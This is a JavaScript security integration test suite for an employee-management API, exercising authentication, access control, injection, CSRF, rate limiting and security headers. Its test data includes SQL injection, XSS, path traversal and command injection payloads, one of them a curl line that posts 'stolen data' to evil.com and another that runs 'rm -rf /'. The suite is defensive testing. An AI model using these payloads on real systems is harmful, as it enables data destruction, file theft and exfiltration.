const request = require('supertest');
const crypto = require('crypto');
const { setupTestEnvironment, teardownTestEnvironment } = require('../setup');

describe('Security Integration Tests', () => {
  let app;
  let database;
  let adminToken;
  let userToken;
  let managerToken;

  beforeAll(async () => {
    const setup = await setupTestEnvironment();
    app = setup.app;
    database = setup.database;

    // Create users with different roles
    const adminUser = await request(app)
      .post('/api/auth/register')
      .send({
        name: 'Admin User',
        email: 'admin@security-test.com',
        password: 'AdminPass123!',
        role: 'admin'
      });

    const managerUser = await request(app)
      .post('/api/auth/register')
      .send({
        name: 'Manager User',
        email: 'manager@security-test.com',
        password: 'ManagerPass123!',
        role: 'manager'
      });

    const regularUser = await request(app)
      .post('/api/auth/register')
      .send({
        name: 'Regular User',
        email: 'user@security-test.com',
        password: 'UserPass123!',
        role: 'employee'
      });

    // Get authentication tokens
    const adminLogin = await request(app)
      .post('/api/auth/login')
      .send({ email: 'admin@security-test.com', password: 'AdminPass123!' });
    adminToken = adminLogin.body.token;

    const managerLogin = await request(app)
      .post('/api/auth/login')
      .send({ email: 'manager@security-test.com', password: 'ManagerPass123!' });
    managerToken = managerLogin.body.token;

    const userLogin = await request(app)
      .post('/api/auth/login')
      .send({ email: 'user@security-test.com', password: 'UserPass123!' });
    userToken = userLogin.body.token;
  }, 30000);

  afterAll(async () => {
    await teardownTestEnvironment(database);
  });

  describe('Authentication Security', () => {
    test('Password strength validation', async () => {
      const weakPasswords = [
        'password',
        '123456',
        'qwerty',
        'abc123',
        'Password', // Missing special character and number
        'pass123', // Too short
        'PASSWORD123!' // Missing lowercase
      ];

      for (const password of weakPasswords) {
        const response = await request(app)
          .post('/api/auth/register')
          .send({
            name: 'Test User',
            email: `test${Math.random()}@example.com`,
            password,
            role: 'employee'
          });

        expect(response.status).toBe(400);
        expect(response.body.errors).toBeDefined();
        expect(response.body.errors.some(error =>
          error.field === 'password' || error.message.toLowerCase().includes('password')
        )).toBe(true);
      }
    });

    test('Account lockout after failed login attempts', async () => {
      const testEmail = 'lockout-test@example.com';

      // Create a test user
      await request(app)
        .post('/api/auth/register')
        .send({
          name: 'Lockout Test',
          email: testEmail,
          password: 'ValidPass123!',
          role: 'employee'
        });

      // Attempt multiple failed logins
      const failedAttempts = 6; // Assuming lockout after 5 attempts
      const responses = [];

      for (let i = 0; i < failedAttempts; i++) {
        const response = await request(app)
          .post('/api/auth/login')
          .send({
            email: testEmail,
            password: 'WrongPassword123!'
          });

        responses.push(response);
      }

      // First few attempts should return 401 (unauthorized)
      expect(responses.slice(0, 4).every(r => r.status === 401)).toBe(true);

      // Last attempts should return 429 (too many requests) or 423 (locked)
      const lastResponse = responses[responses.length - 1];
      expect([423, 429].includes(lastResponse.status)).toBe(true);
      expect(lastResponse.body.message).toMatch(/locked|blocked|attempts/i);

      // Valid credentials should also be blocked
      const validLoginResponse = await request(app)
        .post('/api/auth/login')
        .send({
          email: testEmail,
          password: 'ValidPass123!'
        });

      expect([423, 429].includes(validLoginResponse.status)).toBe(true);
    });

    test('Session security and token validation', async () => {
      // Test with invalid token
      const invalidTokenResponse = await request(app)
        .get('/api/employees')
        .set('Authorization', 'Bearer invalid_token_here');

      expect(invalidTokenResponse.status).toBe(401);

      // Test with expired token (would need to generate an expired token)
      // This would typically involve creating a token with past expiration

      // Test token injection in different formats
      const tokenInjectionTests = [
        'Bearer ' + adminToken + '; DROP TABLE users; --',
        'Bearer <script>alert("xss")</script>',
        'Bearer ' + 'a'.repeat(10000), // Very long token
        'InvalidScheme ' + adminToken,
        'Bearer\x00' + adminToken, // Null byte injection
      ];

      for (const maliciousAuth of tokenInjectionTests) {
        const response = await request(app)
          .get('/api/employees')
          .set('Authorization', maliciousAuth);

        expect(response.status).toBe(401);
      }
    });

    test('Password reset security', async () => {
      const testEmail = 'reset-test@example.com';

      // Create test user
      await request(app)
        .post('/api/auth/register')
        .send({
          name: 'Reset Test',
          email: testEmail,
          password: 'OriginalPass123!',
          role: 'employee'
        });

      // Request password reset
      const resetResponse = await request(app)
        .post('/api/auth/forgot-password')
        .send({ email: testEmail });

      expect(resetResponse.status).toBe(200);

      // Get reset token from database (in real scenario, this would be from email)
      const userRecord = await database.query(
        'SELECT reset_token, reset_token_expires FROM users WHERE email = ?',
        [testEmail]
      );

      expect(userRecord[0].reset_token).toBeDefined();
      expect(userRecord[0].reset_token_expires).toBeDefined();

      const resetToken = userRecord[0].reset_token;

      // Test invalid reset attempts
      const invalidResetAttempts = [
        { token: 'invalid_token', password: 'NewPass123!' },
        { token: resetToken, password: 'weak' }, // Weak password
        { token: resetToken + 'modified', password: 'NewPass123!' }, // Modified token
      ];

      for (const attempt of invalidResetAttempts) {
        const response = await request(app)
          .post('/api/auth/reset-password')
          .send(attempt);

        expect(response.status).toBe(400);
      }

      // Valid reset should work
      const validResetResponse = await request(app)
        .post('/api/auth/reset-password')
        .send({
          token: resetToken,
          password: 'NewValidPass123!'
        });

      expect(validResetResponse.status).toBe(200);

      // Old password should not work
      const oldPasswordLogin = await request(app)
        .post('/api/auth/login')
        .send({
          email: testEmail,
          password: 'OriginalPass123!'
        });

      expect(oldPasswordLogin.status).toBe(401);

      // New password should work
      const newPasswordLogin = await request(app)
        .post('/api/auth/login')
        .send({
          email: testEmail,
          password: 'NewValidPass123!'
        });

      expect(newPasswordLogin.status).toBe(200);

      // Reset token should be invalidated
      const reusedTokenResponse = await request(app)
        .post('/api/auth/reset-password')
        .send({
          token: resetToken,
          password: 'AnotherPass123!'
        });

      expect(reusedTokenResponse.status).toBe(400);
    });
  });

  describe('Authorization & Access Control', () => {
    test('Role-based access control (RBAC)', async () => {
      // Test admin-only endpoints
      const adminOnlyEndpoints = [
        { method: 'get', path: '/api/admin/users' },
        { method: 'post', path: '/api/admin/system-settings' },
        { method: 'delete', path: '/api/admin/purge-data' },
        { method: 'get', path: '/api/admin/audit-logs' }
      ];

      for (const endpoint of adminOnlyEndpoints) {
        // Manager should not have access
        const managerResponse = await request(app)[endpoint.method](endpoint.path)
          .set('Authorization', `Bearer ${managerToken}`);
        expect([403, 404].includes(managerResponse.status)).toBe(true);

        // Regular user should not have access
        const userResponse = await request(app)[endpoint.method](endpoint.path)
          .set('Authorization', `Bearer ${userToken}`);
        expect([403, 404].includes(userResponse.status)).toBe(true);

        // Admin should have access (if endpoint exists)
        const adminResponse = await request(app)[endpoint.method](endpoint.path)
          .set('Authorization', `Bearer ${adminToken}`);
        expect([200, 201, 404].includes(adminResponse.status)).toBe(true); // 404 if not implemented
      }
    });

    test('Resource ownership validation', async () => {
      // Create employee as manager
      const employeeResponse = await request(app)
        .post('/api/employees')
        .set('Authorization', `Bearer ${managerToken}`)
        .send({
          name: 'Test Employee',
          email: 'test-employee@example.com',
          position: 'Test Position',
          department: 'Test Department',
          hourlyRate: 15,
          maxHoursPerWeek: 40,
          availableHours: {}
        });

      expect(employeeResponse.status).toBe(201);
      const employeeId = employeeResponse.body.employee.id;

      // Regular user should not be able to modify this employee
      const unauthorizedUpdateResponse = await request(app)
        .put(`/api/employees/${employeeId}`)
        .set('Authorization', `Bearer ${userToken}`)
        .send({ hourlyRate: 20 });

      expect(unauthorizedUpdateResponse.status).toBe(403);

      // Manager should be able to modify
      const authorizedUpdateResponse = await request(app)
        .put(`/api/employees/${employeeId}`)
        .set('Authorization', `Bearer ${managerToken}`)
        .send({ hourlyRate: 18 });

      expect(authorizedUpdateResponse.status).toBe(200);

      // Admin should also be able to modify
      const adminUpdateResponse = await request(app)
        .put(`/api/employees/${employeeId}`)
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ hourlyRate: 20 });

      expect(adminUpdateResponse.status).toBe(200);
    });

    test('Horizontal privilege escalation prevention', async () => {
      // Create two employees with different managers
      const employee1Response = await request(app)
        .post('/api/employees')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          name: 'Employee 1',
          email: 'emp1@example.com',
          position: 'Position 1',
          department: 'Department 1',
          managerId: 'manager1',
          hourlyRate: 15,
          maxHoursPerWeek: 40,
          availableHours: {}
        });

      const employee2Response = await request(app)
        .post('/api/employees')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          name: 'Employee 2',
          email: 'emp2@example.com',
          position: 'Position 2',
          department: 'Department 2',
          managerId: 'manager2',
          hourlyRate: 15,
          maxHoursPerWeek: 40,
          availableHours: {}
        });

      const employee1Id = employee1Response.body.employee.id;
      const employee2Id = employee2Response.body.employee.id;

      // Manager should not be able to access employee they don't manage
      // This test assumes the API checks manager relationships
      const unauthorizedAccessResponse = await request(app)
        .get(`/api/employees/${employee2Id}`)
        .set('Authorization', `Bearer ${managerToken}`);

      // Depending on implementation, this might be 403 or filtered results
      expect([200, 403, 404].includes(unauthorizedAccessResponse.status)).toBe(true);

      if (unauthorizedAccessResponse.status === 200) {
        // If 200, ensure the response doesn't contain sensitive data
        // or that it's properly filtered based on manager relationships
        expect(unauthorizedAccessResponse.body.employee).toBeDefined();
      }
    });
  });

  describe('Input Validation & Injection Prevention', () => {
    test('SQL injection prevention', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE employees; --",
        "' OR '1'='1",
        "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'hacked'); --",
        "' UNION SELECT password FROM users WHERE email='admin@example.com' --",
        "'; UPDATE users SET role='admin' WHERE email='user@example.com'; --"
      ];

      for (const payload of sqlInjectionPayloads) {
        // Test in employee search
        const searchResponse = await request(app)
          .get(`/api/employees?search=${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(searchResponse.status).toBe(200);
        expect(searchResponse.body.employees).toBeDefined();

        // Test in employee creation
        const createResponse = await request(app)
          .post('/api/employees')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            name: payload,
            email: `test${Math.random()}@example.com`,
            position: payload,
            department: payload,
            hourlyRate: 15,
            maxHoursPerWeek: 40,
            availableHours: {}
          });

        // Should either succeed with sanitized data or fail validation
        expect([200, 201, 400].includes(createResponse.status)).toBe(true);

        if (createResponse.status === 201) {
          // Ensure data was sanitized
          expect(createResponse.body.employee.name).not.toContain('DROP TABLE');
          expect(createResponse.body.employee.position).not.toContain('INSERT INTO');
        }
      }

      // Verify database integrity (tables should still exist)
      const employeesResponse = await request(app)
        .get('/api/employees')
        .set('Authorization', `Bearer ${adminToken}`);

      expect(employeesResponse.status).toBe(200);
      expect(employeesResponse.body.employees).toBeDefined();
    });

    test('XSS prevention', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<svg onload="alert(\'XSS\')">',
        '"><script>alert("XSS")</script>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>'
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/employees')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            name: payload,
            email: `xss-test${Math.random()}@example.com`,
            position: payload,
            department: payload,
            hourlyRate: 15,
            maxHoursPerWeek: 40,
            availableHours: {},
            notes: payload
          });

        if (response.status === 201) {
          // Ensure XSS payload was sanitized
          const employee = response.body.employee;
          expect(employee.name).not.toContain('<script>');
          expect(employee.position).not.toContain('onerror');
          expect(employee.department).not.toContain('javascript:');
          expect(employee.notes).not.toContain('<iframe>');

          // Get the employee and verify data is still sanitized
          const getResponse = await request(app)
            .get(`/api/employees/${employee.id}`)
            .set('Authorization', `Bearer ${adminToken}`);

          expect(getResponse.status).toBe(200);
          const retrievedEmployee = getResponse.body.employee;
          expect(retrievedEmployee.name).not.toContain('<script>');
          expect(retrievedEmployee.position).not.toContain('alert');
        }
      }
    });

    test('Command injection prevention', async () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '`whoami`',
        '$(cat /etc/hosts)',
        '; rm -rf /',
        '& ping -c 1 evil.com',
        '; curl -X POST http://evil.com/stolen-data'
      ];

      for (const payload of commandInjectionPayloads) {
        // Test in file upload functionality if exists
        const response = await request(app)
          .post('/api/employees/import')
          .set('Authorization', `Bearer ${adminToken}`)
          .attach('file', Buffer.from(`name,email,position\nTest,test@example.com${payload},Position`), 'test.csv');

        // Should either process safely or reject
        expect([200, 400, 422].includes(response.status)).toBe(true);

        if (response.status === 200) {
          // Ensure no command injection occurred
          expect(response.body.errors || []).not.toContain(payload);
        }
      }
    });

    test('Path traversal prevention', async () => {
      const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        '../config/database.yml',
        '../../../../proc/self/environ',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', // URL encoded
        '....//....//....//etc/passwd'
      ];

      for (const payload of pathTraversalPayloads) {
        // Test file download endpoints
        const downloadResponse = await request(app)
          .get(`/api/files/download/${encodeURIComponent(payload)}`)
          .set('Authorization', `Bearer ${adminToken}`);

        // Should not allow access to system files
        expect([400, 403, 404].includes(downloadResponse.status)).toBe(true);

        if (downloadResponse.status === 200) {
          // If somehow successful, ensure it's not a system file
          expect(downloadResponse.text).not.toContain('root:');
          expect(downloadResponse.text).not.toContain('password:');
        }

        // Test file upload with traversal in filename
        const uploadResponse = await request(app)
          .post('/api/files/upload')
          .set('Authorization', `Bearer ${adminToken}`)
          .attach('file', Buffer.from('test content'), payload);

        expect([400, 422].includes(uploadResponse.status)).toBe(true);
      }
    });
  });

  describe('Session Management & CSRF Protection', () => {
    test('Session fixation prevention', async () => {
      // Get initial session info
      const initialResponse = await request(app)
        .get('/api/auth/session-info')
        .set('Authorization', `Bearer ${userToken}`);

      expect(initialResponse.status).toBe(200);
      const initialSessionId = initialResponse.body.sessionId;

      // Login should create new session
      const loginResponse = await request(app)
        .post('/api/auth/login')
        .send({
          email: 'user@security-test.com',
          password: 'UserPass123!'
        });

      expect(loginResponse.status).toBe(200);
      const newToken = loginResponse.body.token;

      // New session should have different ID
      const newSessionResponse = await request(app)
        .get('/api/auth/session-info')
        .set('Authorization', `Bearer ${newToken}`);

      expect(newSessionResponse.status).toBe(200);
      expect(newSessionResponse.body.sessionId).not.toBe(initialSessionId);
    });

    test('Session timeout enforcement', async () => {
      // This test would need to be adapted based on session timeout configuration
      // For testing, we might need to mock time or use a shorter timeout

      const shortLivedLoginResponse = await request(app)
        .post('/api/auth/login')
        .send({
          email: 'user@security-test.com',
          password: 'UserPass123!'
        });

      const shortLivedToken = shortLivedLoginResponse.body.token;

      // Immediately should work
      const immediateResponse = await request(app)
        .get('/api/employees')
        .set('Authorization', `Bearer ${shortLivedToken}`);

      expect(immediateResponse.status).toBe(200);

      // Mock session expiry by manipulating token timestamp if possible
      // Or test session refresh functionality
      const refreshResponse = await request(app)
        .post('/api/auth/refresh')
        .set('Authorization', `Bearer ${shortLivedToken}`);

      if (refreshResponse.status === 200) {
        expect(refreshResponse.body.token).toBeDefined();
        expect(refreshResponse.body.token).not.toBe(shortLivedToken);
      }
    });

    test('CSRF protection', async () => {
      // Test state-changing operations without CSRF token
      const stateChangingOperations = [
        {
          method: 'post',
          path: '/api/employees',
          data: {
            name: 'CSRF Test Employee',
            email: 'csrf-test@example.com',
            position: 'Test Position',
            department: 'Test Department',
            hourlyRate: 15,
            maxHoursPerWeek: 40,
            availableHours: {}
          }
        },
        {
          method: 'put',
          path: '/api/employees/1',
          data: { hourlyRate: 25 }
        },
        {
          method: 'delete',
          path: '/api/employees/1'
        }
      ];

      for (const operation of stateChangingOperations) {
        // Request without CSRF token (simulating cross-site request)
        const response = await request(app)[operation.method](operation.path)
          .set('Authorization', `Bearer ${adminToken}`)
          .set('Origin', 'http://malicious-site.com')
          .set('Referer', 'http://malicious-site.com/attack-page')
          .send(operation.data || {});

        // Should be rejected due to CSRF protection
        // Implementation might use various status codes (403, 400, etc.)
        expect([400, 403, 422].includes(response.status)).toBe(true);
      }
    });

    test('Concurrent session management', async () => {
      // Login from multiple "devices" (sessions)
      const loginPromises = Array(5).fill(null).map(() =>
        request(app)
          .post('/api/auth/login')
          .send({
            email: 'user@security-test.com',
            password: 'UserPass123!'
          })
      );

      const loginResponses = await Promise.all(loginPromises);
      const tokens = loginResponses.map(r => r.body.token);

      // All tokens should be valid initially
      for (const token of tokens) {
        const response = await request(app)
          .get('/api/auth/session-info')
          .set('Authorization', `Bearer ${token}`);

        expect(response.status).toBe(200);
      }

      // Test session limit enforcement if implemented
      const sessionListResponse = await request(app)
        .get('/api/auth/active-sessions')
        .set('Authorization', `Bearer ${tokens[0]}`);

      if (sessionListResponse.status === 200) {
        expect(sessionListResponse.body.sessions).toBeDefined();
        expect(Array.isArray(sessionListResponse.body.sessions)).toBe(true);
      }

      // Test session termination
      const logoutResponse = await request(app)
        .post('/api/auth/logout')
        .set('Authorization', `Bearer ${tokens[0]}`);

      expect(logoutResponse.status).toBe(200);

      // Token should be invalid after logout
      const invalidTokenResponse = await request(app)
        .get('/api/employees')
        .set('Authorization', `Bearer ${tokens[0]}`);

      expect(invalidTokenResponse.status).toBe(401);
    });
  });

  describe('Rate Limiting & DDoS Protection', () => {
    test('Login rate limiting', async () => {
      const testEmail = 'rate-limit-test@example.com';

      // Create test user
      await request(app)
        .post('/api/auth/register')
        .send({
          name: 'Rate Limit Test',
          email: testEmail,
          password: 'TestPass123!',
          role: 'employee'
        });

      // Rapid login attempts
      const loginAttempts = Array(20).fill(null).map(() =>
        request(app)
          .post('/api/auth/login')
          .send({
            email: testEmail,
            password: 'TestPass123!'
          })
      );

      const responses = await Promise.all(loginAttempts);
      const rateLimitedResponses = responses.filter(r => r.status === 429);

      expect(rateLimitedResponses.length).toBeGreaterThan(0);
      expect(rateLimitedResponses[0].headers['retry-after']).toBeDefined();
    });

    test('API endpoint rate limiting', async () => {
      const endpoints = [
        '/api/employees',
        '/api/schedules',
        '/api/rules'
      ];

      for (const endpoint of endpoints) {
        const requests = Array(100).fill(null).map(() =>
          request(app)
            .get(endpoint)
            .set('Authorization', `Bearer ${userToken}`)
        );

        const responses = await Promise.all(requests);
        const rateLimitedResponses = responses.filter(r => r.status === 429);

        // Should have some rate limiting
        expect(rateLimitedResponses.length).toBeGreaterThan(0);

        // Check rate limit headers
        const lastResponse = responses[responses.length - 1];
        if (lastResponse.status === 429) {
          expect(lastResponse.headers['x-ratelimit-limit']).toBeDefined();
          expect(lastResponse.headers['x-ratelimit-remaining']).toBeDefined();
          expect(lastResponse.headers['retry-after']).toBeDefined();
        }
      }
    });

    test('Resource exhaustion protection', async () => {
      // Test large request payloads
      const largeEmployee = {
        name: 'A'.repeat(1000),
        email: 'large-test@example.com',
        position: 'B'.repeat(1000),
        department: 'C'.repeat(1000),
        notes: 'D'.repeat(10000),
        hourlyRate: 15,
        maxHoursPerWeek: 40,
        availableHours: {}
      };

      const largePayloadResponse = await request(app)
        .post('/api/employees')
        .set('Authorization', `Bearer ${adminToken}`)
        .send(largeEmployee);

      // Should reject or handle large payloads appropriately
      expect([400, 413, 422].includes(largePayloadResponse.status)).toBe(true);

      // Test deeply nested JSON
      const deeplyNestedData = {
        name: 'Nested Test',
        email: 'nested@example.com',
        position: 'Test',
        department: 'Test',
        hourlyRate: 15,
        maxHoursPerWeek: 40,
        availableHours: {}
      };

      // Create deeply nested structure
      let current = deeplyNestedData;
      for (let i = 0; i < 100; i++) {
        current.nested = { level: i };
        current = current.nested;
      }

      const nestedResponse = await request(app)
        .post('/api/employees')
        .set('Authorization', `Bearer ${adminToken}`)
        .send(deeplyNestedData);

      expect([400, 413, 422].includes(nestedResponse.status)).toBe(true);
    });
  });

  describe('Data Protection & Privacy', () => {
    test('Password storage security', async () => {
      const testUser = {
        name: 'Password Test User',
        email: 'password-test@example.com',
        password: 'TestPassword123!',
        role: 'employee'
      };

      await request(app)
        .post('/api/auth/register')
        .send(testUser);

      // Check that password is not stored in plain text
      const userRecord = await database.query(
        'SELECT password, email FROM users WHERE email = ?',
        [testUser.email]
      );

      expect(userRecord[0].password).toBeDefined();
      expect(userRecord[0].password).not.toBe(testUser.password);
      expect(userRecord[0].password.length).toBeGreaterThan(50); // Should be hashed
      expect(userRecord[0].password).toMatch(/^\$2[aby]\$\d+\$/); // bcrypt format
    });

    test('Sensitive data exposure prevention', async () => {
      // Create employee with sensitive data
      const employeeResponse = await request(app)
        .post('/api/employees')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          name: 'Sensitive Data Test',
          email: 'sensitive@example.com',
          position: 'Test Position',
          department: 'Test Department',
          hourlyRate: 25,
          socialSecurityNumber: '123-45-6789',
          bankAccount: '1234567890',
          maxHoursPerWeek: 40,
          availableHours: {}
        });

      const employeeId = employeeResponse.body.employee.id;

      // Regular user should not see sensitive data
      const userViewResponse = await request(app)
        .get(`/api/employees/${employeeId}`)
        .set('Authorization', `Bearer ${userToken}`);

      if (userViewResponse.status === 200) {
        expect(userViewResponse.body.employee.socialSecurityNumber).toBeUndefined();
        expect(userViewResponse.body.employee.bankAccount).toBeUndefined();
      }

      // Manager might see limited sensitive data
      const managerViewResponse = await request(app)
        .get(`/api/employees/${employeeId}`)
        .set('Authorization', `Bearer ${managerToken}`);

      if (managerViewResponse.status === 200) {
        // Sensitive data should be masked or hidden
        if (managerViewResponse.body.employee.socialSecurityNumber) {
          expect(managerViewResponse.body.employee.socialSecurityNumber).toMatch(/\*+/);
        }
      }

      // Admin should see full data (if authorized)
      const adminViewResponse = await request(app)
        .get(`/api/employees/${employeeId}`)
        .set('Authorization', `Bearer ${adminToken}`);

      expect(adminViewResponse.status).toBe(200);
      // Admin access might still mask certain fields depending on policy
    });

    test('Data encryption in transit', async () => {
      // Test that sensitive operations require HTTPS in production
      // This would typically be handled by infrastructure, but we can test headers

      const response = await request(app)
        .post('/api/auth/login')
        .set('X-Forwarded-Proto', 'http') // Simulate HTTP request
        .send({
          email: 'user@security-test.com',
          password: 'UserPass123!'
        });

      // Should either redirect to HTTPS or reject HTTP for sensitive operations
      // Implementation depends on security middleware
      if (process.env.NODE_ENV === 'production') {
        expect([301, 302, 426].includes(response.status)).toBe(true);
      }
    });

    test('Personal data access controls', async () => {
      // Test GDPR-like data access controls
      const userDataResponse = await request(app)
        .get('/api/users/me/data')
        .set('Authorization', `Bearer ${userToken}`);

      if (userDataResponse.status === 200) {
        expect(userDataResponse.body.userData).toBeDefined();
        expect(userDataResponse.body.userData.email).toBe('user@security-test.com');

        // Should include data processing information
        expect(userDataResponse.body.dataProcessing).toBeDefined();
        expect(userDataResponse.body.retentionPolicy).toBeDefined();
      }

      // Test data deletion request
      const deletionRequestResponse = await request(app)
        .post('/api/users/me/deletion-request')
        .set('Authorization', `Bearer ${userToken}`)
        .send({ reason: 'Account closure' });

      expect([200, 202].includes(deletionRequestResponse.status)).toBe(true);

      if (deletionRequestResponse.status === 200) {
        expect(deletionRequestResponse.body.deletionRequestId).toBeDefined();
        expect(deletionRequestResponse.body.processingTime).toBeDefined();
      }
    });
  });

  describe('Security Headers & CORS', () => {
    test('Security headers presence', async () => {
      const response = await request(app)
        .get('/api/health')
        .set('Authorization', `Bearer ${userToken}`);

      // Check for important security headers
      expect(response.headers['x-content-type-options']).toBe('nosniff');
      expect(response.headers['x-frame-options']).toMatch(/DENY|SAMEORIGIN/);
      expect(response.headers['x-xss-protection']).toBe('1; mode=block');
      expect(response.headers['strict-transport-security']).toBeDefined();
      expect(response.headers['referrer-policy']).toBeDefined();

      // Content Security Policy
      expect(response.headers['content-security-policy']).toBeDefined();

      // Should not expose server information
      expect(response.headers['server']).toBeUndefined();
      expect(response.headers['x-powered-by']).toBeUndefined();
    });

    test('CORS configuration security', async () => {
      // Test CORS preflight
      const preflightResponse = await request(app)
        .options('/api/employees')
        .set('Origin', 'https://evil.com')
        .set('Access-Control-Request-Method', 'POST')
        .set('Access-Control-Request-Headers', 'Authorization, Content-Type');

      // Should not allow arbitrary origins
      expect(preflightResponse.headers['access-control-allow-origin']).not.toBe('*');

      if (preflightResponse.headers['access-control-allow-origin']) {
        expect(preflightResponse.headers['access-control-allow-origin']).not.toBe('https://evil.com');
      }

      // Test actual CORS request
      const corsResponse = await request(app)
        .get('/api/employees')
        .set('Origin', 'https://evil.com')
        .set('Authorization', `Bearer ${userToken}`);

      if (corsResponse.headers['access-control-allow-origin']) {
        expect(corsResponse.headers['access-control-allow-origin']).not.toBe('https://evil.com');
      }
    });
  });

  afterAll(() => {
    console.log('\n=== SECURITY TEST SUMMARY ===');
    console.log('✅ Authentication security tests completed');
    console.log('✅ Authorization and access control tests completed');
    console.log('✅ Input validation and injection prevention tests completed');
    console.log('✅ Session management and CSRF protection tests completed');
    console.log('✅ Rate limiting and DDoS protection tests completed');
    console.log('✅ Data protection and privacy tests completed');
    console.log('✅ Security headers and CORS tests completed');
  });
});